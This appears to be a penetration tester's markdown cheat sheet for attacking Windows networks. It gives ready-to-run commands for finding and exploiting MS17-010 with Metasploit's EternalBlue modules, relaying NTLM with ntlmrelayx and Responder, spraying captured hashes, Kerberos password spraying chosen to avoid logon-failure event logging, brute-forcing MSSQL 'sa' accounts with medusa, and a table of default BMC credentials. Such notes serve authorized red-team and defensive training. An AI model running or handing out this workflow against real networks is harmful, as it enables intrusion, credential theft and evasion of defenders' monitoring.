## SMB Vulns

### Detection

Grep host IP addresses with 445/tcp open and save to a file, 445.txt.

Run RunFinger.py in the Responder repository (make sure you use the script utility or tee to save the output):

`while read -r line;do ./RunFinger.py -i $line -g;done <445.txt`

Grep the RunFinger.py output for 'MS17-010: True'.

-OR-

Metasploit:

`use auxiliary/scanner/smb/smb_ms17_010`

### Exploit:
```
use auxiliary/admin/smb/ms17_010_command
use exploit/windows/smb/ms17_010_eternalblue
use exploit/windows/smb/ms17_010_eternalblue_win8
use exploit/windows/smb/ms17_010_psexec
```

## SMB Relaying

Run crackmapexec with the --gen-relay-list option to generate a file containing hosts that don't require SMB Signing.

Run Impacket ntlmrelayx with the -tf option specifying the file from the previous step.

`./ntlmrelayx [-t [target IP] | -tf [targetsfile] (from --gen-relay-list)] -l [LOOTDIR] -of [outputfile]`

Rerun Responder:

`./Responder.py -I <interface> -wrd`

Monitor ntlmrelayx output for any hashes that get dumped. If you get some, use crackmapexec to spray hashes across the network to discover systems that reuse the same local administrator account credentials.

No admin - SOL?

Modifications to ntlmrelayx

• Ropnop modified ntlmrelayx to not “waste” unprivileged SMB connections • Added two new options

• '--enum-local-admins'

• If the command execution fails, query local SAM for who has the right privileges

• --rid-cycle

• If the command execution fails, perform a RID cycle attack using LSAT to enumerate domain objects and save the result to a CSV • Ropnop's branch here:

• https://github.com/ropnop/impacket/tree/feature/enum_unprivdn

## Password Spraying

Password Guessing with Kerberos
(From Ropnop, https://github.com/ropnop/kerberos_windows_scripts)
- kinit_horizontal_brute.sh : Much less noise than SMB spraying and blue team is less likely to see failed attempts in the logs because Kerberos pre-authentication doesn't trigger a Logon Failure event (4625). It does trigger event 4771, "Kerberos pre-authentication failed" which is less likely to be logged than 4625.

- Note from Ropnop's slides: Putting an IP address for the DC saves DNS lookups and makes this work faster.

### MSSQL

`medusa -H scans/mssql-hosts.txt -u sa -P ./default-mssql-passwords.txt -M mssql |tee /root/logs/mssql-passwords.log`

Blank password:

`medusa -H scans/mssql-hosts.txt -u sa -e ns -M mssql |tee /root/logs/mssql-passwords.log`

## IPMI

### Enumeration

`msf> use  auxiliary/scanner/ipmi/ipmi_version`


| Product Name | Default Username |	Default Password |
| --- | --- | --- |
| HP Integrated Lights Out (iLO)	| Administrator	| <factory randomized 8-character string> |
| Dell Remote Access Card (iDRAC, DRAC)	| root	| calvin |
IBM Integrated Management Module (IMM)	USERID	PASSW0RD (with a zero)
Fujitsu Integrated Remote Management Controller	admin	admin
Supermicro IPMI (2.0)	ADMIN	ADMIN
Oracle/Sun Integrated Lights Out Manager (ILOM)	root	changeme
ASUS iKVM BMC	admin	admin
